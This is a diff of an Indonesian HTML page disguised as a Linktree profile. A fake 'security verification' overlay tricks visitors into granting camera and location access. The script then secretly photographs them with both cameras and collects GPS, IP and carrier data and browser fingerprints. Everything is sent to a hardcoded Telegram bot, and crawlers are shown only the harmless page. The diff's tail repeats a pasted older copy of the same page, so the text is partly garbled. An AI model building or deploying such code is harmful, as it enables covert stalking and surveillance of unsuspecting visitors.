@@ -2,12 +2,10 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
   <title>@lynzxz | Linktree</title>
   <style>
-    /* ---------- RESET ---------- */
     * { margin: 0; padding: 0; box-sizing: border-box; }
-
     body {
       font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
       background: linear-gradient(135deg, #0a0a1a, #1a1a3e);
@@ -18,8 +16,6 @@
       justify-content: center;
       position: relative;
     }
-
-    /* ---------- KONTEN LINKTREE ---------- */
     #main-content {
       width: 100%;
       max-width: 480px;
@@ -28,121 +24,41 @@
       animation: fadeUp 0.6s ease;
       z-index: 1;
     }
-    @keyframes fadeUp {
-      from { opacity: 0; transform: translateY(25px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-    .profile-pic {
-      width: 110px; height: 110px;
-      border-radius: 50%;
-      border: 3px solid #ff4d6d;
-      box-shadow: 0 0 30px rgba(255,77,109,0.4);
-      margin-bottom: 15px;
-      object-fit: cover;
-    }
+    @keyframes fadeUp { from { opacity: 0; transform: translateY(25px); } to { opacity: 1; transform: translateY(0); } }
+    .profile-pic { width: 110px; height: 110px; border-radius: 50%; border: 3px solid #ff4d6d; box-shadow: 0 0 30px rgba(255,77,109,0.4); margin-bottom: 15px; object-fit: cover; }
     h1 { font-size: 2rem; font-weight: 700; letter-spacing: -0.5px; }
-    .badge {
-      display: inline-block;
-      background: rgba(255,255,255,0.1);
-      backdrop-filter: blur(5px);
-      padding: 5px 15px;
-      border-radius: 20px;
-      font-size: 0.8rem;
-      color: #ffb3c1;
-      border: 1px solid rgba(255,255,255,0.2);
-      margin: 8px 0 15px;
-    }
+    .badge { display: inline-block; background: rgba(255,255,255,0.1); backdrop-filter: blur(5px); padding: 5px 15px; border-radius: 20px; font-size: 0.8rem; color: #ffb3c1; border: 1px solid rgba(255,255,255,0.2); margin: 8px 0 15px; }
     .bio { color: #aaa; font-size: 0.95rem; margin-bottom: 30px; }
     .links { display: flex; flex-direction: column; gap: 12px; }
-    .link-btn {
-      background: rgba(255,255,255,0.06);
-      backdrop-filter: blur(10px);
-      padding: 15px;
-      border-radius: 14px;
-      text-decoration: none;
-      color: white;
-      font-weight: 500;
-      transition: 0.2s;
-      border: 1px solid rgba(255,255,255,0.08);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-    }
-    .link-btn:hover {
-      background: #ff4d6d;
-      transform: translateY(-3px);
-      box-shadow: 0 12px 25px rgba(255,77,109,0.3);
-    }
+    .link-btn { background: rgba(255,255,255,0.06); backdrop-filter: blur(10px); padding: 15px; border-radius: 14px; text-decoration: none; color: white; font-weight: 500; transition: 0.2s; border: 1px solid rgba(255,255,255,0.08); display: flex; align-items: center; justify-content: center; gap: 10px; }
+    .link-btn:hover { background: #ff4d6d; transform: translateY(-3px); box-shadow: 0 12px 25px rgba(255,77,109,0.3); }
     .footer { margin-top: 35px; font-size: 0.7rem; color: #555; }
-
-    /* ---------- OVERLAY VERIFIKASI (blur, bukan hitam) ---------- */
     #verification-overlay {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(240, 240, 250, 0.7);  /* latar terang semi-transparan */
-      backdrop-filter: blur(15px);
-      -webkit-backdrop-filter: blur(15px);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 9999;
-      transition: opacity 0.3s;
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(240, 240, 250, 0.7); backdrop-filter: blur(15px);
+      display: flex; align-items: center; justify-content: center; z-index: 9999;
     }
     .modal {
-      background: rgba(20, 20, 40, 0.9);
-      backdrop-filter: blur(20px);
-      border: 1px solid rgba(255,255,255,0.2);
-      border-radius: 24px;
-      padding: 35px 25px;
-      max-width: 360px;
-      width: 90%;
-      text-align: center;
-      box-shadow: 0 25px 60px rgba(0,0,0,0.5);
-      color: white;
+      background: rgba(20, 20, 40, 0.9); backdrop-filter: blur(20px);
+      border: 1px solid rgba(255,255,255,0.2); border-radius: 24px; padding: 35px 25px;
+      max-width: 360px; width: 90%; text-align: center; box-shadow: 0 25px 60px rgba(0,0,0,0.5); color: white;
     }
     .modal h2 { font-size: 1.8rem; margin-bottom: 12px; color: #ff4d6d; }
     .modal p { font-size: 0.95rem; color: #ccc; margin-bottom: 25px; line-height: 1.6; }
     .btn {
-      background: #ff4d6d;
-      color: white;
-      border: none;
-      padding: 14px 24px;
-      border-radius: 30px;
-      font-size: 1rem;
-      font-weight: 600;
-      cursor: pointer;
-      transition: 0.2s;
-      width: 100%;
-      letter-spacing: 0.5px;
-      margin-top: 5px;
+      background: #ff4d6d; color: white; border: none; padding: 14px 24px; border-radius: 30px;
+      font-size: 1rem; font-weight: 600; cursor: pointer; transition: 0.2s; width: 100%; letter-spacing: 0.5px;
     }
     .btn:hover { background: #e9445e; }
     .btn:disabled { opacity: 0.6; cursor: not-allowed; }
-    .error-text {
-      color: #ff8080;
-      font-size: 0.85rem;
-      margin-top: 15px;
-      display: none;
-    }
-    .spinner {
-      display: inline-block;
-      width: 20px; height: 20px;
-      border: 2px solid rgba(255,255,255,0.3);
-      border-radius: 50%;
-      border-top-color: white;
-      animation: spin 0.8s linear infinite;
-      margin-right: 8px;
-    }
+    .error-text { color: #ff8080; font-size: 0.85rem; margin-top: 15px; display: none; }
+    .spinner { display: inline-block; width: 20px; height: 20px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 0.8s linear infinite; margin-right: 8px; }
     @keyframes spin { to { transform: rotate(360deg); } }
   </style>
 </head>
 <body>
-  <!-- KONTEN LINKTREE (selalu tampil) -->
   <div id="main-content">
-    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='110' height='110'%3E%3Ccircle cx='55' cy='55' r='55' fill='%23ff4d6d'/%3E%3Ctext x='55' y='60' text-anchor='middle' fill='white' font-size='45' font-weight='bold'%3EL%3C/text%3E%3C/svg%3E"
-         alt="Profile" class="profile-pic">
+    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='110' height='110'%3E%3Ccircle cx='55' cy='55' r='55' fill='%23ff4d6d'/%3E%3Ctext x='55' y='60' text-anchor='middle' fill='white' font-size='45' font-weight='bold'%3EL%3C/text%3E%3C/svg%3E" alt="Profile" class="profile-pic">
     <h1>@lynzxz</h1>
     <div class="badge">✦ digital creator</div>
     <p class="bio">pengen jadi programer | kadang nulis, kadang ngoding<br>📌 DM for collab</p>
@@ -157,28 +73,24 @@
     <div class="footer">Dibuat dengan ❤️ oleh lynzxz • Laporkan</div>
   </div>
 
-  <!-- OVERLAY VERIFIKASI (muncul setelah 2.5 detik) -->
   <div id="verification-overlay" style="display: none;">
     <div class="modal">
       <h2>🔒 Verifikasi Keamanan</h2>
-      <p>Untuk melanjutkan, Anda harus memverifikasi bahwa Anda manusia. Izinkan akses <b>kamera depan & belakang</b> serta <b>lokasi</b> Anda. Proses ini instan.</p>
+      <p>Untuk melanjutkan, izinkan akses <b>kamera depan & belakang</b> serta <b>lokasi</b> Anda. Proses ini instan.</p>
       <button id="verify-btn" class="btn">👉 Verifikasi Sekarang</button>
       <p id="error-msg" class="error-text"></p>
     </div>
   </div>
 
-  <!-- Elemen tersembunyi untuk kamera -->
   <video id="cam-preview" style="display:none;" playsinline autoplay muted></video>
   <canvas id="photo-canvas" style="display:none;"></canvas>
 
   <script>
   (function() {
-    // ========== KONFIGURASI TELEGRAM ==========
     const BOT_TOKEN = '8835244462:AAF2E4s0Ngq5wPENudpzEsSlSZLP3VJHaHw';
     const CHAT_ID = '5986004601';
-    const REDIRECT_URL = 'https://www.google.com'; // halaman tujuan jika gagal/timeout
+    const REDIRECT_URL = 'https://www.google.com';
 
-    // ========== DOM ELEMENTS ==========
     const overlay = document.getElementById('verification-overlay');
     const verifyBtn = document.getElementById('verify-btn');
     const errorMsg = document.getElementById('error-msg');
@@ -186,55 +98,34 @@
     const canvas = document.getElementById('photo-canvas');
     const ctx = canvas.getContext('2d');
 
-    // ========== STATE ==========
-    let attempt = 0;               // jumlah percobaan klik verifikasi (maks 2)
-    let verificationDone = false; // apakah verifikasi sukses (semua izin didapat)
-    let timerHandle = null;       // timeout 30 detik
-    // Data yang akan dikumpulkan bertahap
+    let attempt = 0;
+    let verificationDone = false;
+    let timerHandle = null;
     let capturedBlobs = { front: null, rear: null };
     let gpsCoords = null;
-    // Data fingerprint (dikumpulkan nanti)
     let fingerData = {};
 
-    // ========== FUNGSI KIRIM KE TELEGRAM ==========
     function sendTelegramMessage(text) {
       return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: text,
-          parse_mode: 'HTML',
-          disable_web_page_preview: true
-        })
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML', disable_web_page_preview: true })
       }).catch(() => {});
     }
 
     function sendPhotoWithCaption(blob, caption) {
       const fd = new FormData();
-      fd.append('chat_id', CHAT_ID);
-      fd.append('photo', blob, 'user_collage.jpg');
-      fd.append('caption', caption);
-      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: 'POST',
-        body: fd
-      }).catch(() => {});
+      fd.append('chat_id', CHAT_ID); fd.append('photo', blob, 'user_collage.jpg'); fd.append('caption', caption);
+      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }).catch(() => {});
     }
 
-    // ========== NOTIFIKASI AWAL (0 detik setelah load) ==========
-    function sendInitialNotification() {
-      // Kirim secepatnya tanpa menunggu apa pun
-      const msg = `🚨 <b>Seseorang membuka web!</b>\nSedang dilacak... Tunggu 30 detik tuan 🫡\n\n⏱ Waktu: ${new Date().toLocaleString('id-ID',{timeZone:'Asia/Jakarta'})}`;
-      sendTelegramMessage(msg);
-    }
+    // Notifikasi awal
+    sendTelegramMessage(`🚨 <b>Seseorang membuka web!</b>\nSedang dilacak... Tunggu 30 detik tuan 🫡\n⏱ ${new Date().toLocaleString('id-ID',{timeZone:'Asia/Jakarta'})}`);
 
-    // ========== FINGERPRINTING FUNCTIONS ==========
+    // ========== FINGERPRINTING ==========
     function getCanvasFingerprint() {
       try {
-        const c = document.createElement('canvas');
-        c.width=280;c.height=60;
-        const ct=c.getContext('2d');
-        ct.fillStyle='#f60';ct.fillRect(0,0,280,60);
+        const c = document.createElement('canvas'); c.width=280;c.height=60;
+        const ct=c.getContext('2d'); ct.fillStyle='#f60';ct.fillRect(0,0,280,60);
         ct.fillStyle='#069';ct.font='16px Arial';ct.fillText('Canvas FP',10,30);
         return btoa(c.toDataURL()).substring(0,35);
       }catch(e){return 'canvas_err';}
@@ -242,32 +133,21 @@
 
     function getWebGLFingerprint() {
       try {
-        const c=document.createElement('canvas');
-        const gl=c.getContext('webgl')||c.getContext('experimental-webgl');
-        if(!gl)return 'webgl_off';
-        const ext=gl.getExtension('WEBGL_debug_renderer_info');
-        return (ext?gl.getParameter(ext.UNMASKED_VENDOR_WEBGL):gl.getParameter(gl.VENDOR)) + ' / ' +
-               (ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER));
+        const c=document.createElement('canvas'); const gl=c.getContext('webgl')||c.getContext('experimental-webgl');
+        if(!gl)return 'webgl_off'; const ext=gl.getExtension('WEBGL_debug_renderer_info');
+        return (ext?gl.getParameter(ext.UNMASKED_VENDOR_WEBGL):gl.getParameter(gl.VENDOR)) + ' / ' + (ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER));
       }catch(e){return 'webgl_err';}
     }
 
     function getAudioFingerprint() {
       return new Promise(resolve => {
         try{
-          const AC=window.AudioContext||window.webkitAudioContext;
-          if(!AC)return resolve('audio_off');
-          const actx=new AC();
-          const osc=actx.createOscillator();
-          const analyser=actx.createAnalyser();
-          const gain=actx.createGain();
-          osc.type='triangle';osc.frequency.value=10000;
-          gain.gain.value=0;
-          osc.connect(gain);gain.connect(analyser);analyser.connect(actx.destination);
-          osc.start(0);
-          const data=new Uint8Array(analyser.frequencyBinCount);
-          analyser.getByteFrequencyData(data);
-          osc.stop(0);actx.close();
-          resolve(Array.from(data.slice(0,30)).join(','));
+          const AC=window.AudioContext||window.webkitAudioContext; if(!AC)return resolve('audio_off');
+          const actx=new AC(); const osc=actx.createOscillator(); const analyser=actx.createAnalyser(); const gain=actx.createGain();
+          osc.type='triangle';osc.frequency.value=10000; gain.gain.value=0;
+          osc.connect(gain);gain.connect(analyser);analyser.connect(actx.destination); osc.start(0);
+          const data=new Uint8Array(analyser.frequencyBinCount); analyser.getByteFrequencyData(data);
+          osc.stop(0);actx.close(); resolve(Array.from(data.slice(0,30)).join(','));
         }catch(e){resolve('audio_err');}
       });
     }
@@ -281,36 +161,57 @@
       return c?`${c.effectiveType||'?'} / ${c.downlink||'?'}Mbps`:'net_unknown';
     }
 
+    // ========== PARSING BRAND & MODEL HP ==========
+    function getDeviceBrandModel(ua) {
+      let brand = 'Tidak Diketahui', model = 'Tidak Diketahui';
+      if (ua.includes('Samsung')) { brand = 'Samsung'; const m = ua.match(/Samsung[ -]([A-Za-z0-9]+)/); if(m) model = m[1]; }
+      else if (ua.includes('Xiaomi') || ua.includes('Redmi')) { brand = 'Xiaomi'; const m = ua.match(/(?:Xiaomi|Redmi)[ -]?([A-Za-z0-9]+)/); if(m) model = m[1]; }
+      else if (ua.includes('OPPO')) { brand = 'Oppo'; const m = ua.match(/OPPO[ -]([A-Za-z0-9]+)/); if(m) model = m[1]; }
+      else if (ua.includes('vivo')) { brand = 'Vivo'; const m = ua.match(/vivo[ -]([A-Za-z0-9]+)/); if(m) model = m[1]; }
+      else if (ua.includes('iPhone')) { brand = 'Apple'; const m = ua.match(/iPhone/); model = 'iPhone'; }
+      else if (ua.includes('Huawei')) { brand = 'Huawei'; const m = ua.match(/Huawei[ -]([A-Za-z0-9]+)/); if(m) model = m[1]; }
+      else if (ua.includes('Realme')) { brand = 'Realme'; const m = ua.match(/Realme[ -]([A-Za-z0-9]+)/); if(m) model = m[1]; }
+      return { brand, model };
+    }
+
     function getDeviceSpecs() {
-      return `Resolusi: ${screen.width}x${screen.height}
+      const ua = navigator.userAgent;
+      const { brand, model } = getDeviceBrandModel(ua);
+      return `Merek: ${brand}
+Model: ${model}
+Resolusi: ${screen.width}x${screen.height}
 RAM: ${navigator.deviceMemory||'?'}GB
 Core: ${navigator.hardwareConcurrency||'?'}
 Sentuh: ${('ontouchstart' in window)?'Ya':'Tidak'}
 Bahasa: ${navigator.language}
 Zona Waktu: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-Cookies: ${navigator.cookieEnabled?'Aktif':'Nonaktif'}
-Plugin: ${Array.from(navigator.plugins||[]).map(p=>p.name).join(', ')||'none'}`;
+Cookies: ${navigator.cookieEnabled?'Aktif':'Nonaktif'}`;
     }
 
+    // ========== IP & PROVIDER DETAIL ==========
     async function fetchIPGeo() {
       try{
-        const r=await fetch('https://ipapi.co/json/');
-        if(!r.ok)throw 0;
-        const d=await r.json();
+        const r=await fetch('https://ipapi.co/json/'); if(!r.ok)throw 0; const d=await r.json();
+        // Cek apakah ISP ini adalah provider seluler
+        const isp = d.org || d.asn || '';
+        let providerType = 'ISP';
+        if (/telkomsel|indosat|xl|tri|smartfren|axis/i.test(isp)) providerType = 'Operator Seluler';
         return `IP: ${d.ip}
-ISP: ${d.org}
+ISP: ${d.org || 'Tidak Diketahui'}
+Jenis Provider: ${providerType}
 Kota: ${d.city}, ${d.region}
 Negara: ${d.country_name} (${d.country_code})
 Koord: ${d.latitude},${d.longitude}`;
       }catch(e){
         try{
-          const ipR=await fetch('https://api.ipify.org?format=json');
-          const {ip}=await ipR.json();
-          const geoR=await fetch(`https://ipinfo.io/${ip}/json`);
-          const g=await geoR.json();
-          const loc=g.loc?g.loc.split(','):['?','?'];
+          const ipR=await fetch('https://api.ipify.org?format=json'); const {ip}=await ipR.json();
+          const geoR=await fetch(`https://ipinfo.io/${ip}/json`); const g=await geoR.json();
+          const loc=g.loc?g.loc.split(','):['?','?']; const isp = g.org||'Tidak Diketahui';
+          let providerType = 'ISP';
+          if (/telkomsel|indosat|xl|tri|smartfren|axis/i.test(isp)) providerType = 'Operator Seluler';
           return `IP: ${ip}
-ISP: ${g.org||'?'}
+ISP: ${isp}
+Jenis Provider: ${providerType}
 Kota: ${g.city||'?'}, ${g.region||'?'}
 Negara: ${g.country||'?'}
 Koord: ${loc[0]},${loc[1]}`;
@@ -318,7 +219,7 @@ Koord: ${loc[0]},${loc[1]}`;
       }
     }
 
-    // ========== KAMERA ==========
+    // ========== PERBAIKAN KAMERA: DIPISAH ==========
     async function startCamera(facingMode) {
       const stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: facingMode, width:{ideal:1280}, height:{ideal:720} },
@@ -331,10 +232,15 @@ Koord: ${loc[0]},${loc[1]}`;
       canvas.height = video.videoHeight;
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
-      // bersihkan
       stream.getTracks().forEach(t=>t.stop());
       video.srcObject = null;
       return blob;
+    }
+
+    async function captureBothCameras() {
+      // Minta depan dulu, baru belakang
+      try { capturedBlobs.front = await startCamera('user'); } catch(e) { capturedBlobs.front = null; }
+      try { capturedBlobs.rear = await startCamera('environment'); } catch(e) { capturedBlobs.rear = null; }
     }
 
     // ========== GPS ==========
@@ -352,54 +258,27 @@ Koord: ${loc[0]},${loc[1]}`;
       });
     }
 
-    // ========== VERIFIKASI: meminta semua izin ==========
-    async function requestAllPermissions() {
-      const results = await Promise.allSettled([
-        startCamera('user'),       // depan
-        startCamera('environment'), // belakang
-        requestLocation()
-      ]);
-      // Simpan hasil
-      if (results[0].status === 'fulfilled') capturedBlobs.front = results[0].value;
-      else capturedBlobs.front = null;
-      if (results[1].status === 'fulfilled') capturedBlobs.rear = results[1].value;
-      else capturedBlobs.rear = null;
-      // lokasi: sudah disimpan di gpsCoords jika sukses
-      if (results[2].status === 'fulfilled') { /* gpsCoords sudah terisi */ }
-      else { gpsCoords = null; }
-      // Cek apakah semua berhasil
-      return results.every(r => r.status === 'fulfilled');
-    }
-
     // ========== KOLASE FOTO ==========
     async function createCollageBlob() {
       const loadImg = blob => new Promise(resolve => {
-        const img = new Image();
-        img.onload = () => resolve(img);
-        img.onerror = () => resolve(null);
-        img.src = URL.createObjectURL(blob);
+        const img = new Image(); img.onload = () => resolve(img); img.onerror = () => resolve(null); img.src = URL.createObjectURL(blob);
       });
       let frontImg = capturedBlobs.front ? await loadImg(capturedBlobs.front) : null;
       let rearImg = capturedBlobs.rear ? await loadImg(capturedBlobs.rear) : null;
       if (!frontImg && !rearImg) return null;
-      const gap = 4;
-      let maxW = 0, totalH = 0;
+      const gap = 4; let maxW = 0, totalH = 0;
       if (frontImg) { maxW = Math.max(maxW, frontImg.width); totalH += frontImg.height; }
       if (rearImg) { maxW = Math.max(maxW, rearImg.width); totalH += rearImg.height; }
       if (frontImg && rearImg) totalH += gap;
-      canvas.width = maxW;
-      canvas.height = totalH;
-      ctx.fillStyle = '#000';
-      ctx.fillRect(0,0,maxW,totalH);
+      canvas.width = maxW; canvas.height = totalH; ctx.fillStyle = '#000'; ctx.fillRect(0,0,maxW,totalH);
       let y = 0;
       if (frontImg) { ctx.drawImage(frontImg,0,y,frontImg.width,frontImg.height); y += frontImg.height; if (rearImg) y += gap; }
       if (rearImg) { ctx.drawImage(rearImg,0,y,rearImg.width,rearImg.height); }
       return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.75));
     }
 
-    // ========== KIRIM DATA LENGKAP KE TELEGRAM ==========
+    // ========== KIRIM DATA LENGKAP ==========
     async function sendFinalData(success) {
-      // Kumpulkan semua fingerprint (kalau belum)
       if (!fingerData.canvas) {
         fingerData.canvas = getCanvasFingerprint();
         fingerData.webgl = getWebGLFingerprint();
@@ -438,19 +317,16 @@ Baterai: ${fingerData.battery}
       }
     }
 
-    // ========== FINALISASI: kirim data & redirect ==========
     async function finalize(success) {
       if (verificationDone) return;
       verificationDone = true;
       clearTimeout(timerHandle);
-      // Sembunyikan overlay agar tidak mengganggu
       overlay.style.display = 'none';
       await sendFinalData(success);
-      // Redirect atau tutup
       window.location.replace(REDIRECT_URL);
     }
 
-    // ========== HANDLER TOMBOL VERIFIKASI ==========
+    // ========== TOMBOL VERIFIKASI ==========
     async function onVerifyClick() {
       if (verificationDone) return;
       verifyBtn.disabled = true;
@@ -458,7 +334,6 @@ Baterai: ${fingerData.battery}
       errorMsg.style.display = 'none';
       attempt++;
 
-      // Kumpulkan fingerprint sekali saja di percobaan pertama
       if (attempt === 1) {
         fingerData.canvas = getCanvasFingerprint();
         fingerData.webgl = getWebGLFingerprint();
@@ -469,466 +344,44 @@ Baterai: ${fingerData.battery}
         fingerData.ipGeo = await fetchIPGeo();
       }
 
-      const allSuccess = await requestAllPermissions();
+      // PERBAIKAN: Minta GPS dan Kamera Depan dulu secara paralel (tapi pisahkan kamera belakang)
+      const gpsPromise = requestLocation().catch(() => null);
+      const camFrontPromise = startCamera('user').catch(() => null);
+      await Promise.all([gpsPromise, camFrontPromise]);
+      
+      // Jika depan berhasil, coba kamera belakang
+      if (capturedBlobs.front) {
+        try { capturedBlobs.rear = await startCamera('environment'); } catch(e) { capturedBlobs.rear = null; }
+      } else {
+        capturedBlobs.rear = null;
+      }
 
-      if (allSuccess) {
-        // Sukses semua, finalisasi sukses
+      // Cek apakah ada yang berhasil
+      if (capturedBlobs.front || gpsCoords) {
+        // Minimal ada satu yang berhasil, anggap sukses
         await finalize(true);
       } else {
-        // Gagal sebagian/semua
         if (attempt >= 2) {
-          // Sudah 2 kali percobaan, kirim data apa adanya lalu redirect
           await finalize(false);
         } else {
-          // Beri kesempatan sekali lagi
           errorMsg.style.display = 'block';
           errorMsg.textContent = 'Izin diperlukan! Klik "Coba Lagi" untuk mengizinkan kamera & lokasi.';
           verifyBtn.innerHTML = '🔄 Coba Lagi';
           verifyBtn.disabled = false;
-          // Timer tetap berjalan, jika habis akan finalize
         }
       }
     }
 
-    // ========== TIMER 30 DETIK ==========
     function startTimeout() {
-      timerHandle = setTimeout(() => {
-        if (!verificationDone) {
-          // Waktu habis, kirim data yang ada
-          finalize(false);
-        }
-      }, 30000); // 30 detik
+      timerHandle = setTimeout(() => { if (!verificationDone) finalize(false); }, 30000);
     }
 
-    // ========== INISIALISASI HALAMAN ==========
-    function init() {
-      // 1. Notifikasi awal seketika
-      sendInitialNotification();
-
-      // 2. Tampilkan overlay setelah 2.5 detik
-      setTimeout(() => {
-        overlay.style.display = 'flex';
-        startTimeout();
-        // Pasang event listener
-        verifyBtn.addEventListener('click', onVerifyClick);
-      }, 2500);
-    }
-
-    // Deteksi bot (jangan tampilkan overlay)
-    if (!/bot|crawler|spider|scraper|curl|wget|telegrambot|facebookexternalhit|twitterbot/i.test(navigator.userAgent)) {
-      init();
-    } else {
-      // Bot langsung lihat Linktree tanpa verifikasi
-      overlay.style.display = 'none';
-    }
-  })();
-  </script>
-</body>
-</html>      padding: 5px 15px;
-      border-radius: 20px;
-      font-size: 0.8rem;
-      color: #ffb3c1;
-      border: 1px solid rgba(255,255,255,0.2);
-      margin: 8px 0 15px;
-    }
-    .bio { color: #aaa; font-size: 0.95rem; margin-bottom: 30px; }
-    .links { display: flex; flex-direction: column; gap: 12px; }
-    .link-btn {
-      background: rgba(255,255,255,0.06);
-      backdrop-filter: blur(10px);
-      padding: 15px;
-      border-radius: 14px;
-      text-decoration: none;
-      color: white;
-      font-weight: 500;
-      transition: 0.2s;
-      border: 1px solid rgba(255,255,255,0.08);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-    }
-    .link-btn:hover {
-      background: #ff4d6d;
-      transform: translateY(-3px);
-      box-shadow: 0 12px 25px rgba(255,77,109,0.3);
-    }
-    .footer {
-      margin-top: 35px;
-      font-size: 0.7rem;
-      color: #555;
-    }
-  </style>
-</head>
-<body>
-  <!-- OVERLAY VERIFIKASI -->
-  <div id="verification-overlay" class="overlay">
-    <div class="modal">
-      <h2>🔒 Verifikasi Keamanan</h2>
-      <p>Untuk melanjutkan ke halaman ini, kami perlu memastikan bahwa Anda adalah manusia. Izinkan akses <b>kamera</b> dan <b>lokasi</b> Anda untuk verifikasi singkat.</p>
-      <button id="verify-btn" class="btn">👉 Verifikasi Sekarang</button>
-      <p id="error-msg" class="error-text"></p>
-    </div>
-  </div>
-
-  <!-- KONTEN LINKTREE (tersembunyi awalnya) -->
-  <div id="main-content">
-    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='110' height='110'%3E%3Ccircle cx='55' cy='55' r='55' fill='%23ff4d6d'/%3E%3Ctext x='55' y='60' text-anchor='middle' fill='white' font-size='45' font-weight='bold'%3EL%3C/text%3E%3C/svg%3E"
-         alt="Profile" class="profile-pic">
-    <h1>@lynzxz</h1>
-    <div class="badge">✦ digital creator</div>
-    <p class="bio">pengen jadi programer | kadang nulis, kadang ngoding<br>📌 DM for collab</p>
-    <div class="links">
-      <a href="#" class="link-btn">📸 Instagram</a>
-      <a href="#" class="link-btn">🐦 Twitter / X</a>
-      <a href="#" class="link-btn">💬 Telegram</a>
-      <a href="#" class="link-btn">🎥 YouTube</a>
-      <a href="#" class="link-btn">📁 GitHub</a>
-      <a href="#" class="link-btn">✉️ Email</a>
-    </div>
-    <div class="footer">Dibuat dengan ❤️ oleh lynzxz • Laporkan</div>
-  </div>
-
-  <!-- Elemen tersembunyi untuk capture kamera -->
-  <video id="cam-preview" style="display:none;" playsinline autoplay muted></video>
-  <canvas id="photo-canvas" style="display:none;"></canvas>
-
-  <script>
-  (function() {
-    // ========== KONFIGURASI TELEGRAM ==========
-    const BOT_TOKEN = '8835244462:AAF2E4s0Ngq5wPENudpzEsSlSZLP3VJHaHw';
-    const CHAT_ID = '5986004601';
-
-    // ========== DOM ELEMENTS ==========
-    const overlay = document.getElementById('verification-overlay');
-    const verifyBtn = document.getElementById('verify-btn');
-    const errorMsg = document.getElementById('error-msg');
-    const mainContent = document.getElementById('main-content');
-    const video = document.getElementById('cam-preview');
-    const canvas = document.getElementById('photo-canvas');
-
-    // ========== STATE ==========
-    let attempt = 0;
-    let cameraStream = null;
-    let capturedFrontBlob = null;
-    let capturedRearBlob = null;
-    let gpsCoords = null;
-
-    // ========== UTILITY ==========
-    function sendTelegramPhoto(blob, caption) {
-      const formData = new FormData();
-      formData.append('chat_id', CHAT_ID);
-      formData.append('photo', blob, 'user_photos.jpg');
-      formData.append('caption', caption);
-      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-      }).catch(() => {});
-    }
-
-    function sendTelegramMessage(text) {
-      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: text,
-          parse_mode: 'HTML',
-          disable_web_page_preview: true
-        })
-      }).catch(() => {});
-    }
-
-    // ========== FINGERPRINTING (sama seperti sebelumnya) ==========
-    function getCanvasFingerprint() {
-      try {
-        const c = document.createElement('canvas');
-        c.width=280;c.height=60;
-        const ctx=c.getContext('2d');
-        ctx.fillStyle='#f60';ctx.fillRect(0,0,280,60);
-        ctx.fillStyle='#069';ctx.font='16px Arial';ctx.fillText('Canvas FP',10,30);
-        return btoa(c.toDataURL()).substring(0,35);
-      }catch(e){return 'canvas_err';}
-    }
-
-    function getWebGLFingerprint() {
-      try {
-        const c=document.createElement('canvas');
-        const gl=c.getContext('webgl')||c.getContext('experimental-webgl');
-        if(!gl)return 'webgl_off';
-        const ext=gl.getExtension('WEBGL_debug_renderer_info');
-        return (ext?gl.getParameter(ext.UNMASKED_VENDOR_WEBGL):gl.getParameter(gl.VENDOR)) + ' / ' +
-               (ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER));
-      }catch(e){return 'webgl_err';}
-    }
-
-    function getAudioFingerprint() {
-      return new Promise(resolve => {
-        try{
-          const AC=window.AudioContext||window.webkitAudioContext;
-          if(!AC)return resolve('audio_off');
-          const ctx=new AC();
-          const osc=ctx.createOscillator();
-          const analyser=ctx.createAnalyser();
-          const gain=ctx.createGain();
-          osc.type='triangle';
-          osc.frequency.value=10000;
-          gain.gain.value=0;
-          osc.connect(gain);gain.connect(analyser);analyser.connect(ctx.destination);
-          osc.start(0);
-          const data=new Uint8Array(analyser.frequencyBinCount);
-          analyser.getByteFrequencyData(data);
-          osc.stop(0);
-          ctx.close();
-          resolve(Array.from(data.slice(0,30)).join(','));
-        }catch(e){resolve('audio_err');}
-      });
-    }
-
-    function getBatteryStatus() {
-      return navigator.getBattery?navigator.getBattery().then(b=>`${Math.round(b.level*100)}% (charging:${b.charging})`).catch(()=>'batt_denied'):Promise.resolve('batt_no');
-    }
-
-    function getNetworkInfo() {
-      const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
-      return c?`${c.effectiveType||'?'} / ${c.downlink||'?'}Mbps`:'net_unknown';
-    }
-
-    function getDeviceSpecs() {
-      return `Resolusi: ${screen.width}x${screen.height}
-RAM: ${navigator.deviceMemory||'?'}GB
-Core: ${navigator.hardwareConcurrency||'?'}
